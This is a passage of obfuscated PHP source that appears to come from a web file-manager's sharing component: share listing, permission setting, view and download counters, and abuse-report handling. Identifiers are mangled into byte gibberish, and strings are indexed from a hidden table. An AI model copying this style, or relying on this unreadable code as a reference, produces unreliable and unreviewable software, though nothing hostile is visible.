[526] => array($Ä„ÛÂš [1041], 0), $Ä„ÛÂš [629] => array($Ä„ÛÂš [1041], 0), $Ä„ÛÂš [2006] => $Ä„ÛÂš [1959])); if ($ª­ëóå == $Ä„ÛÂš [2007]) { $î€şÓ = array($Ä„ÛÂš [526] => 1); } else { if ($ª­ëóå == $Ä„ÛÂš [1190]) { $î€şÓ = array($Ä„ÛÂš [629] => 1); } } $î€şÓ[$Ä„ÛÂš [1671]] = USER_ID; $›®éîœÉ = $this->where($î€şÓ)->selectPage($ãÇ•“ú); return $›®éîœÉ; } protected function listToMe($´äîæ¦¢ = 300) { $ê°Ê =& $_SERVER[”ú…±Ú¥]; $‹æç©Ãõ = Model($ê°Ê[2008])->userGroupParents(USER_ID); $×°Í©Ş— = array($ê°Ê[614] => SourceModel::TYPE_USER, $ê°Ê[534] => USER_ID); if ($‹æç©Ãõ) { $×°Í©Ş— = array(array($ê°Ê[614] => SourceModel::TYPE_USER, $ê°Ê[534] => USER_ID), array($ê°Ê[614] => SourceModel::TYPE_GROUP, $ê°Ê[534] => array($ê°Ê[7], $‹æç©Ãõ)), $ê°Ê[2006] => $ê°Ê[1959]); } $òĞ€û¬Ö = Model($ê°Ê[632])->where($×°Í©Ş—)->selectPage($´äîæ¦¢); $îÒ‘±í = array_to_keyvalue_group($òĞ€û¬Ö[$ê°Ê[407]], $ê°Ê[631]); if (!$îÒ‘±í) { return $òĞ€û¬Ö; } $êÙá•¡ = $ê°Ê[2009]; $×°Í©Ş— = array($ê°Ê[631] => array($ê°Ê[456], array_keys($îÒ‘±í)), $ê°Ê[1671] => array($ê°Ê[1043], $ê°Ê[208])); $†ìËğ = $this->field($êÙá•¡)->where($×°Í©Ş—)->select(); foreach ($†ìËğ as $‡ÃÜñ÷Ô => &$“”ôúê) { $“”ôúê[$ê°Ê[2005]] = $îÒ‘±í[$“”ôúê[$ê°Ê[631]]]; } unset($“”ôúê); $èŠØıÈ = array($ê°Ê[2010] => $†ìËğ, $ê°Ê[2011] => $òĞ€û¬Ö[$ê°Ê[404]]); return $èŠØıÈ; } protected function shareAdd($ä•úÊ¡, $¬£ÜŠŠ) { $“ôóÊÖ =& $_SERVER[”ú…±Ú¥]; $…Ã†ø = $this->_addShareData($ä•úÊ¡, $¬£ÜŠŠ); if (!empty($¬£ÜŠŠ[$“ôóÊÖ[2012]])) { $this->_shareAuthSet($…Ã†ø, $¬£ÜŠŠ[$“ôóÊÖ[2012]]); } $this->shareEventAdd($ä•úÊ¡, $¬£ÜŠŠ, $“ôóÊÖ[2013]); return $…Ã†ø; } protected function shareAddSystem($û€¡îé, $ ¾ä¹¹) { $ùõ©ë·È =& $_SERVER[”ú…±Ú¥]; $±¼í§… = $this->_addShareData($û€¡îé, $ ¾ä¹¹, $ùõ©ë·È[1316]); $this->_shareAuthSet($±¼í§…, $ ¾ä¹¹[$ùõ©ë·È[2012]]); return $±¼í§…; } private function shareEventAdd($ë ŞÁ‰ê, $Şß¢¯”‚, $§û‹€Ìª = "\x61\144\144") { $·Ï‰Í =& $_SERVER[”ú…±Ú¥]; if (!$ë ŞÁ‰ê || $ë ŞÁ‰ê == $·Ï‰Í[208]) { return; } if ($§û‹€Ìª == $·Ï‰Í[2013]) { if ($Şß¢¯”‚[$·Ï‰Í[526]] == $·Ï‰Í[88]) { Model($·Ï‰Í[599])->eventShare($ë ŞÁ‰ê, $·Ï‰Í[2014]); } if ($Şß¢¯”‚[$·Ï‰Í[629]] == $·Ï‰Í[88]) { Model($·Ï‰Í[599])->eventShare($ë ŞÁ‰ê, $·Ï‰Í[2015]); } return; } $ú•ŠöÙë = $this->getInfoByPath($ë ŞÁ‰ê); $Œ¡¨‘œ = $·Ï‰Í[2016]; if ($ú•ŠöÙë[$·Ï‰Í[526]] == $·Ï‰Í[208] && $Şß¢¯”‚[$·Ï‰Í[526]] == $·Ï‰Í[88]) { $Œ¡¨‘œ = $·Ï‰Í[2014]; } if ($ú•ŠöÙë[$·Ï‰Í[526]] == $·Ï‰Í[88] && $Şß¢¯”‚[$·Ï‰Í[526]] == $·Ï‰Í[208]) { $Œ¡¨‘œ = $·Ï‰Í[2017]; } if ($ú•ŠöÙë[$·Ï‰Í[629]] == $·Ï‰Í[208] && $Şß¢¯”‚[$·Ï‰Í[629]] == $·Ï‰Í[88]) { $Œ¡¨‘œ = $·Ï‰Í[2015]; } if ($ú•ŠöÙë[$·Ï‰Í[629]] == $·Ï‰Í[88] && $Şß¢¯”‚[$·Ï‰Í[629]] == $·Ï‰Í[208]) { $Œ¡¨‘œ = $·Ï‰Í[2018]; } Model($·Ï‰Í[599])->eventShare($ë ŞÁ‰ê, $Œ¡¨‘œ); return; } private function _addShareData($«ä°‡î, $·ºò…Í‡ = array(), $’Á‘ÔÚå = false) { $Ú¯Ñ˜š =& $_SERVER[”ú…±Ú¥]; $Ú¿“‡™Ç = $’Á‘ÔÚå == $Ú¯Ñ˜š[1316] ? 0 : USER_ID; $‘ò‚ƒ§Î = array($Ú¯Ñ˜š[455] => $«ä°‡î, $Ú¯Ñ˜š[1662] => $Ú¿“‡™Ç); if ($«ä°‡î == 0) { $‘ò‚ƒ§Î = array($Ú¯Ñ˜š[2019] => $·ºò…Í‡[$Ú¯Ñ˜š[1204]], $Ú¯Ñ˜š[1662] => $Ú¿“‡™Ç); } if ($ƒ¿€ÔÇ„ = $this->where($‘ò‚ƒ§Î)->find()) { return $ƒ¿€ÔÇ„[$Ú¯Ñ˜š[631]]; } if ($«ä°‡î == 0) { $ŸÂëŞÜ = array($Ú¯Ñ˜š[32] => get_path_this($·ºò…Í‡[$Ú¯Ñ˜š[84]])); } else { $ŸÂëŞÜ = Model($Ú¯Ñ˜š[857])->sourceInfo($«ä°‡î); if (!$ŸÂëŞÜ) { return !1; } } if (!$·ºò…Í‡[$Ú¯Ñ˜š[1571]]) { $·ºò…Í‡[$Ú¯Ñ˜š[1571]] = $ŸÂëŞÜ[$Ú¯Ñ˜š[32]]; } $ˆïá×İ = array($Ú¯Ñ˜š[1662] => $Ú¿“‡™Ç, $Ú¯Ñ˜š[455] => $«ä°‡î, $Ú¯Ñ˜š[1571] => $Ú¯Ñ˜š[12], $Ú¯Ñ˜š[526] => 0, $Ú¯Ñ˜š[629] => 0, $Ú¯Ñ˜š[1204] => $Ú¯Ñ˜š[12], $Ú¯Ñ˜š[345] => $Ú¯Ñ˜š[12], $Ú¯Ñ˜š[918] => $Ú¯Ñ˜š[12], $Ú¯Ñ˜š[2020] => 0, $Ú¯Ñ˜š[2021] => 0, $Ú¯Ñ˜š[793] => 0, $Ú¯Ñ˜š[2022] => $Ú¯Ñ˜š[12], $Ú¯Ñ˜š[2003] => $Ú¯Ñ˜š[12]); $¢öÏúÓí = explode($Ú¯Ñ˜š[50], $Ú¯Ñ˜š[2023]); foreach ($¢öÏúÓí as $°ˆ¼«Å) { if (!isset($·ºò…Í‡[$°ˆ¼«Å])) { continue; } $ˆïá×İ[$°ˆ¼«Å] = $·ºò…Í‡[$°ˆ¼«Å]; } $ş²ˆú¿ = $this->add($ˆïá×İ); $Úß ¼½½ = array($Ú¯Ñ˜š[2003] => short_id($ş²ˆú¿)); $this->where(array($Ú¯Ñ˜š[2024] => $ş²ˆú¿))->save($Úß ¼½½); return $ş²ˆú¿; } private function _shareAuthSet($¥Ãíü¿Ü, $®åÇå€â) { $¦İîË°® =& $_SERVER[”ú…±Ú¥]; if (!is_array($®åÇå€â)) { return !1; } $şÃâÜé = Model($¦İîË°®[1969]); $şÃâÜé->where(array($¦İîË°®[631] => $¥Ãíü¿Ü))->delete(); $ˆ™·ÇÛØ = array(); foreach ($®åÇå€â as $™›€Ğãä) { $ƒ îÊŸ† = SourceModel::TYPE_USER; if ($™›€Ğãä[$¦İîË°®[449]] == SourceModel::TYPE_GROUP) { $ƒ îÊŸ† = SourceModel::TYPE_GROUP; } $ÒÊĞÎÓµ = array($¦İîË°®[631] => $¥Ãíü¿Ü, $¦İîË°®[449] => $ƒ îÊŸ†, $¦İîË°®[534] => intval($™›€Ğãä[$¦İîË°®[534]]), $¦İîË°®[1965] => 0, $¦İîË°®[2025] => -1); if ($™›€Ğãä[$¦İîË°®[1965]]) { $ÒÊĞÎÓµ[$¦İîË°®[1965]] = $™›€Ğãä[$¦İîË°®[1965]]; } else { if ($™›€Ğãä[$¦İîË°®[2025]]) { $ÒÊĞÎÓµ[$¦İîË°®[2025]] = $™›€Ğãä[$¦İîË°®[2025]]; } } $ˆ™·ÇÛØ[] = $ÒÊĞÎÓµ; } return $şÃâÜé->addAll($ˆ™·ÇÛØ, array(), !0); } public function numViewAdd($§¶²¶Åº) { $ß‚íü­ã =& $_SERVER[”ú…±Ú¥]; $³µèûá = array($ß‚íü­ã[2024] => $§¶²¶Åº); $this->where($³µèûá)->setAdd($ß‚íü­ã[2020]); } public function numDownloadAdd($şÄ’·½¹) { $§ïøÀëÇ =& $_SERVER[”ú…±Ú¥]; $ÅŸğ†Öñ = array($§ïøÀëÇ[2024] => $şÄ’·½¹); $this->where($ÅŸğ†Öñ)->setAdd($§ïøÀëÇ[2021]); } protected function shareEdit($ĞÓËŸ÷, $ÉÚáåˆØ) { $»š¸¹ç€ =& $_SERVER[”ú…±Ú¥]; $é­Ô—ÑŠ = $this->getInfo($ĞÓËŸ÷); if (!$é­Ô—ÑŠ) { return !1; } $this->_checkLinkShare($ÉÚáåˆØ, $é­Ô—ÑŠ); $Æú†ÆâÕ = array(); $àËØ²ìŞ = explode($»š¸¹ç€[50], $»š¸¹ç€[2026]); foreach ($àËØ²ìŞ as $ñ¡äå‹Â) { if (!array_key_exists($ñ¡äå‹Â, $ÉÚáåˆØ)) { continue; } $Æú†ÆâÕ[$ñ¡äå‹Â] = $ÉÚáåˆØ[$ñ¡äå‹Â]; } $this->shareEventAdd($é­Ô—ÑŠ[$»š¸¹ç€[440]], $ÉÚáåˆØ, $»š¸¹ç€[1831]); $this->where(array($»š¸¹ç€[2024] => $ĞÓËŸ÷))->save($Æú†ÆâÕ); if (isset($ÉÚáåˆØ[$»š¸¹ç€[2012]])) { $this->_shareAuthSet($ĞÓËŸ÷, $ÉÚáåˆØ[$»š¸¹ç€[2012]]); } return !0; } private function _checkLinkShare($èÜæÕÍÖ, $şºŠú¤Ë) { $³ñ€Ô¤· =& $_SERVER[”ú…±Ú¥]; if ($èÜæÕÍÖ[$³ñ€Ô¤·[526]] != $³ñ€Ô¤·[88]) { return; } $Ÿã¥åÅ = $şºŠú¤Ë[$³ñ€Ô¤·[87]][$³ñ€Ô¤·[440]]; if ($şºŠú¤Ë[$³ñ€Ô¤·[87]][$³ñ€Ô¤·[33]] != $³ñ€Ô¤·[210]) { $­å×ÔÙ¤ = $this->_folderReport($Ÿã¥åÅ); if (!$­å×ÔÙ¤) { return; } show_json(LNG($³ñ€Ô¤·[2027]) . $³ñ€Ô¤·[2028] . $­å×ÔÙ¤, !1); } $ÉıÊ–î = Model($³ñ€Ô¤·[857])->fileInfoGet($şºŠú¤Ë[$³ñ€Ô¤·[87]][$³ñ€Ô¤·[440]]); if (!$ÉıÊ–î) { return; } $Ó·É¥ÕÊ = $this->shareFileMeta($ÉıÊ–î[$³ñ€Ô¤·[506]]); if (isset($Ó·É¥ÕÊ[$³ñ€Ô¤·[412]]) && $Ó·É¥ÕÊ[$³ñ€Ô¤·[412]] == $³ñ€Ô¤·[88]) { show_json(LNG($³ñ€Ô¤·[2029]), !1); } } private function _folderReport($¾ÎÎ˜®æ) { $æçï¦Õ =& $_SERVER[”ú…±Ú¥]; $“³¬‚²­ = array($æçï¦Õ[506] => array($æçï¦Õ[1041], 0), $æçï¦Õ[782] => 3); $•µêĞ¹ß = Model($æçï¦Õ[2030])->where($“³¬‚²­)->field($æçï¦Õ[506])->select(); if (!$•µêĞ¹ß) { return !1; } $•µêĞ¹ß = array_to_keyvalue($•µêĞ¹ß, $æçï¦Õ[12], $æçï¦Õ[506]); $ıíÏúŞÚ = $æçï¦Õ[50] . $¾ÎÎ˜®æ . $æçï¦Õ[50]; $“³¬‚²­ = array($æçï¦Õ[506] => array($æçï¦Õ[7], $•µêĞ¹ß), $æçï¦Õ[549] => array($æçï¦Õ[421], "\x25{$ıíÏúŞÚ}\x25"), $æçï¦Õ[469] => 0); $ö½Æ¼¦İ = Model($æçï¦Õ[857])->where($“³¬‚²­)->field($æçï¦Õ[2031])->find(); if (!$ö½Æ¼¦İ) { return !1; } $ø’ñäÖ  = substr($ö½Æ¼¦İ[$æçï¦Õ[549]], strpos($ö½Æ¼¦İ[$æçï¦Õ[549]], $ıíÏúŞÚ)); $“³¬‚²­ = array($æçï¦Õ[440] => array($æçï¦Õ[7], trim($ø’ñäÖ , $æçï¦Õ[50]))); $óÓıÅ„¸ = Model($æçï¦Õ[857])->where($“³¬‚²­)->field($æçï¦Õ[32])->select(); $Äô¼ºŒæ = array_to_keyvalue($óÓıÅ„¸, $æçï¦Õ[12], $æçï¦Õ[32]); $Äô¼ºŒæ[] = $ö½Æ¼¦İ[$æçï¦Õ[32]]; return implode($æçï¦Õ[8], $Äô¼ºŒæ); } protected function remove($‰ÒÚüâ) { $˜è®°Ã =& $_SERVER[”ú…±Ú¥]; if (is_array($‰ÒÚüâ)) { $‰ÒÚüâ = array($˜è®°Ã[7], $‰ÒÚüâ); } $¥•§ÔÁò = array($˜è®°Ã[631] => $‰ÒÚüâ); $¼óŞÄê = $this->where($¥•§ÔÁò)->delete(); if ($¼óŞÄê) { Model($˜è®°Ã[632])->where(array($˜è®°Ã[631] => $‰ÒÚüâ))->delete(); } $“„  îæ = is_array($‰ÒÚüâ) ? $‰ÒÚüâ[1] : array($‰ÒÚüâ); for ($ÉÛÅÜ¬æ = 0; $ÉÛÅÜ¬æ < count($“„  îæ); $ÉÛÅÜ¬æ++) { $Éë¼ùÑ£ = $this->getInfo($“„  îæ[$ÉÛÅÜ¬æ]); if ($Éë¼ùÑ£[$˜è®°Ã[629]] == $˜è®°Ã[88]) { Model($˜è®°Ã[599])->eventShare($Éë¼ùÑ£[$˜è®°Ã[440]], $˜è®°Ã[2018]); } if ($Éë¼ùÑ£[$˜è®°Ã[526]] == $˜è®°Ã[88]) { Model($˜è®°Ã[599])->eventShare($Éë¼ùÑ£[$˜è®°Ã[440]], $˜è®°Ã[2017]); } } return $¼óŞÄê; } protected function removeBySource($”›£Şƒ) { $õëŸø§º =& $_SERVER[”ú…±Ú¥]; $’ÀÙèßÚ = array($õëŸø§º[455] => array($õëŸø§º[456], $”›£Şƒ)); $“üø¹…á = $this->field($õëŸø§º[631])->where($’ÀÙèßÚ)->select(); $“üø¹…á = array_to_keyvalue($“üø¹…á, $õëŸø§º[12], $õëŸø§º[631]); if (!$“üø¹…á) { return; } $’ÀÙèßÚ = array($õëŸø§º[2024] => array($õëŸø§º[456], $“üø¹…á)); $this->where($’ÀÙèßÚ)->delete(); Model($õëŸø§º[632])->where($’ÀÙèßÚ)->delete(); } public function listAll($ÄÊÜô—) { $ø¾ô…±ô =& $_SERVER[”ú…±Ú¥]; $ßòâÙü¯ = array(); if ($ÄÊÜô—[$ø¾ô…±ô[1671]]) { $ßòâÙü¯[$ø¾ô…±ô[1671]] = $ÄÊÜô—[$ø¾ô…±ô[1671]]; } if ($ÄÊÜô—[$ø¾ô…±ô[792]]) { $À¡¹Æë£ = $ÄÊÜô—[$ø¾ô…±ô[793]] ? $ÄÊÜô—[$ø¾ô…±ô[793]] : strtotime(date($ø¾ô…±ô[2032])); $ßòâÙü¯[$ø¾ô…±ô[211]] = array($ø¾ô…±ô[371], array($ÄÊÜô—[$ø¾ô…±ô[792]], $À¡¹Æë£)); } if ($ÄÊÜô—[$ø¾ô…±ô[33]]) { $ßòâÙü¯[$ÄÊÜô—[$ø¾ô…±ô[33]]] = 1; } else { $ßòâÙü¯[] = array($ø¾ô…±ô[526] => array($ø¾ô…±ô[1041], 0), $ø¾ô…±ô[629] => array($ø¾ô…±ô[1041], 0), $ø¾ô…±ô[2006] => $ø¾ô…±ô[1959]); } if ($ÄÊÜô—[$ø¾ô…±ô[1955]]) { $ßòâÙü¯[] = array($ø¾ô…±ô[2003] => $ÄÊÜô—[$ø¾ô…±ô[1955]], $ø¾ô…±ô[1571] => array($ø¾ô…±ô[421], "\x25{$ÄÊÜô—[$ø¾ô…±ô[1955]]}\x25"), $ø¾ô…±ô[2006] => $ø¾ô…±ô[1959]); } $Øª‚• ¬ = $this->_makeOrder()->where($ßòâÙü¯)->selectPage(20); if (empty($Øª‚• ¬[$ø¾ô…±ô[407]])) { return array(); } $this->_listDataApply($Øª‚• ¬[$ø¾ô…±ô[407]]); return $Øª‚• ¬; } public function listDataApply($‘Ëøº‡) { $this->_listDataApply($‘Ëøº‡); return $‘Ëøº‡; } private function _listDataApply(&$—š©Œ˜¥) { $Ñò€â²ş =& $_SERVER[”ú…±Ú¥]; $’À£õÕÜ = array_to_keyvalue($—š©Œ˜¥, $Ñò€â²ş[12], $Ñò€â²ş[1671]); $Á‹Õ˜à = Model($Ñò€â²ş[563])->userListInfo(array_unique($’À£õÕÜ)); $ßùİ›Ğ = array_to_keyvalue($—š©Œ˜¥, $Ñò€â²ş[12], $Ñò€â²ş[440]); $øåŒ³³í = Model($Ñò€â²ş[857])->sourceListInfo($ßùİ›Ğ, !0); foreach ($—š©Œ˜¥ as $Ä·ÚåÁä => &$«İÊÓ˜ì) { $üÅĞ’¯­ = $«İÊÓ˜ì[$Ñò€â²ş[1671]]; $«İÊÓ˜ì[$Ñò€â²ş[2033]] = $Á‹Õ˜à[$üÅĞ’¯­] ? $Á‹Õ˜à[$üÅĞ’¯­] : !1; $Õ·Î›‰ì = $«İÊÓ˜ì[$Ñò€â²ş[440]]; $«İÊÓ˜ì[$Ñò€â²ş[87]] = $øåŒ³³í[$Õ·Î›‰ì] ? $øåŒ³³í[$Õ·Î›‰ì] : !1; if ($«İÊÓ˜ì[$Ñò€â²ş[87]][$Ñò€â²ş[469]] == $Ñò€â²ş[88]) { unset($—š©Œ˜¥[$Ä·ÚåÁä]); } if ($«İÊÓ˜ì[$Ñò€â²ş[87]] != $Ñò€â²ş[208] && !$«İÊÓ˜ì[$Ñò€â²ş[87]]) { unset($—š©Œ˜¥[$Ä·ÚåÁä]); } } unset($«İÊÓ˜ì); $—š©Œ˜¥ = array_values($—š©Œ˜¥); } private function _makeOrder($ê€È›Ã = '') { $ïĞ“ş° =& $_SERVER[”ú…±Ú¥]; $›×¦Åü” = array($ïĞ“ş°[211], $ïĞ“ş°[793], $ïĞ“ş°[2020], $ïĞ“ş°[2021]); $´¹Ãåª = array($ïĞ“ş°[488] => $ïĞ“ş°[489], $ïĞ“ş°[490] => $ïĞ“ş°[491]); $Å‹’ŞõÕ = Input::get($ïĞ“ş°[495], $ïĞ“ş°[7], $ïĞ“ş°[461], $›×¦Åü”); $ßÑ¬‚ğ™ = Input::get($ïĞ“ş°[496], $ïĞ“ş°[7], $ïĞ“ş°[2034], array($ïĞ“ş°[1952], $ïĞ“ş°[490])); $ßÑ¬‚ğ™ = $´¹Ãåª[$ßÑ¬‚ğ™]; $ê€È›Ã = $ê€È›Ã . "{$Å‹’ŞõÕ}\x20{$ßÑ¬‚ğ™}"; return $this->order($ê€È›Ã); } public function reportAdd($Ú÷ƒÚç­) { $½Ü¾¬Ğè =& $_SERVER[”ú…±Ú¥]; $Ü°š¶“Ç = array($½Ü¾¬Ğè[631] => $Ú÷ƒÚç­[$½Ü¾¬Ğè[631]], $½Ü¾¬Ğè[1671] => USER_ID); if (Model($½Ü¾¬Ğè[2030])->where($Ü°š¶“Ç)->find()) { return !1; } $ôÃöˆ¥ = array($½Ü¾¬Ğè[631] => $Ú÷ƒÚç­[$½Ü¾¬Ğè[631]], $½Ü¾¬Ğè[1571] => $Ú÷ƒÚç­[$½Ü¾¬Ğè[1571]], $½Ü¾¬Ğè[440] => $Ú÷ƒÚç­[$½Ü¾¬Ğè[440]], $½Ü¾¬Ğè[506] => $Ú÷ƒÚç­[$½Ü¾¬Ğè[506]], $½Ü¾¬Ğè[1671] => USER_ID, $½Ü¾¬Ğè[33] => $Ú÷ƒÚç­[$½Ü¾¬Ğè[33]], $½Ü¾¬Ğè[491] => $Ú÷ƒÚç­[$½Ü¾¬Ğè[491]]); return Model($½Ü¾¬Ğè[2030])->add($ôÃöˆ¥); } public function reportList($È¦º’) { $¾šªù…” =& $_SERVER[”ú…±Ú¥]; $ÛÃôİ¤ = array(); if ($È¦º’[$¾šªù…”[792]]) { $¿‚îÂ¡ï = $È¦º’[$¾šªù…”[793]] ? $È¦º’[$¾šªù…”[793]] : strtotime(date($¾šªù…”[2032])); $ÛÃôİ¤[$¾šªù…”[211]] = array($¾šªù…”[371], array($È¦º’[$¾šªù…”[792]], $¿‚îÂ¡ï)); } if (isset($È¦º’[$¾šªù…”[33]]) && in_array($È¦º’[$¾šªù…”[33]], array($¾šªù…”[88], $¾šªù…”[475], $¾šªù…”[2035], $¾šªù…”[2036], $¾šªù…”[2037]))) { $ÛÃôİ¤[$¾šªù…”[33]] = $È¦º’[$¾šªù…”[33]]; } if (isset($È¦º’[$¾šªù…”[782]]) && in_array($È¦º’[$¾šªù…”[782]], array($¾šªù…”[208], $¾šªù…”[88], $¾šªù…”[475], $¾šªù…”[2035]))) { $ÛÃôİ¤[$¾šªù…”[782]] = $È¦º’[$¾šªù…”[782]]; } $‘Ù¯é = Input::get($¾šªù…”[496], $¾šªù…”[7], $¾šªù…”[2034], array($¾šªù…”[1952], $¾šªù…”[490])); $—ó‡÷‹ = array($¾šªù…”[488] => $¾šªù…”[489], $¾šªù…”[490] => $¾šªù…”[491]); $¸µçµ– = $¾šªù…”[2038] . $—ó‡÷‹[$‘Ù¯é]; $şƒ¹ÖØç = Model($¾šªù…”[2030])->where($ÛÃôİ¤)->order($¸µçµ–)->selectPage(20); if (empty($şƒ¹ÖØç[$¾šªù…”[407]])) { return array(); } $¸àë = array_to_keyvalue_group($şƒ¹ÖØç[$¾šªù…”[407]], $¾šªù…”[782], $¾šªù…”[631]); if (!empty($¸àë[0])) { $È¦º’ = $¸àë[0]; $ÛÃôİ¤ = array($¾šªù…”[631] => array($¾šªù…”[7], $È¦º’)); $Ğ§”Ùá = $this->where($ÛÃôİ¤)->field($¾šªù…”[631])->select(); $Ğ§”Ùá = array_to_keyvalue($Ğ§”Ùá, $¾šªù…”[12], $¾šªù…”[631]); $†šëê‰ = array_diff($È¦º’, $Ğ§”Ùá); if (!empty($†šëê‰)) { foreach ($şƒ¹ÖØç[$¾šªù…”[407]] as $µ¿£‹•¸ => $•¯”Ğ–Ô) { if (in_array($•¯”Ğ–Ô[$¾šªù…”[631]], $†šëê‰)) { unset($şƒ¹ÖØç[$¾šªù…”[407]][$µ¿£‹•¸]); } } } } $this->_listDataApply($şƒ¹ÖØç[$¾šªù…”[407]]); return $şƒ¹ÖØç; } public function reportStatus($‚Ô¶¢ü) { $©Ñ¨°Ğø =& $_SERVER[”ú…±Ú¥]; $ñ‚òÖŠˆ = array($©Ñ¨°Ğø[437] => $‚Ô¶¢ü[$©Ñ¨°Ğø[437]]); $ÎˆŸ°«‹ = Model($©Ñ¨°Ğø[2030])->where($ñ‚òÖŠˆ)->field($©Ñ¨°Ğø[2039])->find(); if (!$ÎˆŸ°«‹) { return !1; } $£×ë¯ÖÒ = array($©Ñ¨°Ğø[782] => $‚Ô¶¢ü[$©Ñ¨°Ğø[782]]); if ($‚Ô¶¢ü[$©Ñ¨°Ğø[782]] == $©Ñ¨°Ğø[2035] && $ÎˆŸ°«‹[$©Ñ¨°Ğø[782]] == $©Ñ¨°Ğø[2035]) { $£×ë¯ÖÒ[$©Ñ¨°Ğø[782]] = 0; } $À²³¥¹™ = Model($©Ñ¨°Ğø[2030])->where($ñ‚òÖŠˆ)->save($£×ë¯ÖÒ); if ($‚Ô¶¢ü[$©Ñ¨°Ğø[782]] == $©Ñ¨°Ğø[475]) { if ($ÎˆŸ°«‹[$©Ñ¨°Ğø[506]] != $©Ñ¨°Ğø[208] && $this->shareFileMeta($ÎˆŸ°«‹[$©Ñ¨°Ğø[506]])) { $this->shareFileMeta($ÎˆŸ°«‹[$©Ñ¨°Ğø[506]], 0); } $this->remove($ÎˆŸ°«‹[$©Ñ¨°Ğø[631]]); return !0; } if ($À²³¥¹™ && $‚Ô¶¢ü[$©Ñ¨°Ğø[782]] == $©Ñ¨°Ğø[2035]) { $˜»óŞÈ‡ = $£×ë¯ÖÒ[$©Ñ¨°Ğø[782]] == $©Ñ¨°Ğø[2035] ? 1 : 0; $this->shareFileMeta($ÎˆŸ°«‹[$©Ñ¨°Ğø[506]], $˜»óŞÈ‡); $this->removeByFile($ÎˆŸ°«‹[$©Ñ¨°Ğø[506]]); } return $À²³¥¹™; } private function removeByFile($¢úÁ˜¾) { $®¸¹Ïø =& $_SERVER[”ú…±Ú¥]; $±°í«» = Model($®¸¹Ïø[857])->where(array($®¸¹Ïø[506] => $¢úÁ˜¾))->field($®¸¹Ïø[440])->select(); $ãÃ€×éÑ = array_to_keyvalue($±°í«», $®¸¹Ïø[12], $®¸¹Ïø[440]); $«­¬ÀÌÄ = array($®¸¹Ïø[440] => array($®¸¹Ïø[7], $ãÃ€×éÑ), $®¸¹Ïø[526] => 1); $±°í«» = $this->where($«­¬ÀÌÄ)->field($®¸¹Ïø[631])->select(); if (empty($±°í«»)) { return; } $Û§•¡Æ† = array_to_keyvalue($±°í«», $®¸¹Ïø[12], $®¸¹Ïø[631]); $this->remove($Û§•¡Æ†); } private function shareFileMeta($ïŞÇ—ìÆ, $ç›³Æ×è = null) { $ÛùÏÃÏ´ =& $_SERVER[”ú…±Ú¥]; $¶ôåìå = array($ÛùÏÃÏ´[506] => $ïŞÇ—ìÆ, $ÛùÏÃÏ´[94] => $ÛùÏÃÏ´[2040]); if (is_null($ç›³Æ×è)) { return Model($ÛùÏÃÏ´[2041])->where($¶ôåìå)->find(); } $¶ôåìå[$ÛùÏÃÏ´[412]] = $ç›³Æ×è; Model($ÛùÏÃÏ´[2041])->add($¶ôåìå, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\x63\145\137\x61\165\164\x68"; public function getAuth($Ÿ·úè À) { $Â³Ğ©· =& $_SERVER[”ú…±Ú¥]; $Ãï£Ù¢ı = $this->sourceAuthSelect($Ÿ·úè À); $Ş‘µŒœó = array(); $¯ö„¥‘ã = array(); $‡œ©ç•í = 2 << 25; foreach ($Ãï£Ù¢ı as $âê—œœ) { $ÇĞùàæ = Model($Â³Ğ©·[536])->listData($âê—œœ[$Â³Ğ©·[1965]]); if (!$ÇĞùàæ) { continue; } $Ş‘µŒœó[] = $âê—œœ; $Ê¼¨‘€— = 0; if ($âê—œœ[$Â³Ğ©·[449]] == SourceModel::TYPE_GROUP) { $Ê¼¨‘€— = $‡œ©ç•í * 2; } if ($âê—œœ[$Â³Ğ©·[449]] == SourceModel::TYPE_USER) { $Ê¼¨‘€— = $‡œ©ç•í; } if ($âê—œœ[$Â³Ğ©·[449]] == SourceModel::TYPE_USER && $âê—œœ[$Â³Ğ©·[534]] == $Â³Ğ©·[208]) { $Ê¼¨‘€— = 0; } $¯ö„¥‘ã[] = $ÇĞùàæ[$Â³Ğ©·[451]] + $Ê¼¨‘€—; } array_multisort($¯ö„¥‘ã, SORT_DESC, $Ş‘µŒœó); return $Ş‘µŒœó; } public function sourceAuthSelect($…³¥÷ù‡) { $ˆóº¯€  =& $_SERVER[”ú…±Ú¥]; static $šòÍËá = array(); $½¥¦Ñì = is_array($…³¥÷ù‡) ? !1 : !0; if ($½¥¦Ñì) { $…³¥÷ù‡ = array($…³¥÷ù‡); } $øˆø±Ù = array(); foreach ($…³¥÷ù‡ as $®À‰ºÀÉ) { if (isset($šòÍËá[$®À‰ºÀÉ])) { $øˆø±Ù[$®À‰ºÀÉ] = $šòÍËá[$®À‰ºÀÉ]; } } if (count($øˆø±Ù) == count($…³¥÷ù‡)) { return $½¥¦Ñì ? $øˆø±Ù[$…³¥÷ù‡[0]] : $øˆø±Ù; } $á·ÀØÔ = $ˆóº¯€ [2042]; $—Å‹¸£ƒ = array($ˆóº¯€ [440] => array($ˆóº¯€ [7], $…³¥÷ù‡)); $ñªîĞç = $this->field($á·ÀØÔ)->order($ˆóº¯€ [437])->where($—Å‹¸£ƒ)->select(); $Ó¹×¬”‰ = array_to_keyvalue_group($ñªîĞç, $ˆóº¯€ [440]); foreach ($…³¥÷ù‡ as $®À‰ºÀÉ) { $šòÍËá[$®À‰ºÀÉ] = $Ó¹×¬”‰[$®À‰ºÀÉ] ? $Ó¹×¬”‰[$®À‰ºÀÉ] : array(); } if ($½¥¦Ñì) { return $ñªîĞç; } return $Ó¹×¬”‰; } public function setAuth($ßÖÚÊİ, $Ó‹µ“ğª) { $¸Ñëöş« =& $_SERVER[”ú…±Ú¥]; $Ø³ãÚú« = Model($¸Ñëöş«[1362])->sourceInfo($ßÖÚÊİ); if (!$Ø³ãÚú«) { return !1; } if ($Ø³ãÚú«[$¸Ñëöş«[449]] != SourceModel::TYPE_GROUP) { return !1; } $¡½­êÛ¸ = 1; $êı»ë¸÷ = $Ø³ãÚú«[$¸Ñëöş«[534]]; if ($êı»ë¸÷ != $¡½­êÛ¸) { $š²¿¥™¼ = array($¸Ñëöş«[1861] => $êı»ë¸÷); $ãÁíÃ€Á = Model($¸Ñëöş«[1951])->field($¸Ñëöş«[1671])->where($š²¿¥™¼)->select(); $ãÁíÃ€Á = array_to_keyvalue($ãÁíÃ€Á, $¸Ñëöş«[12], $¸Ñëöş«[1671]); } $ ¿õ°Æ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $üİº‘Üö = array(); foreach 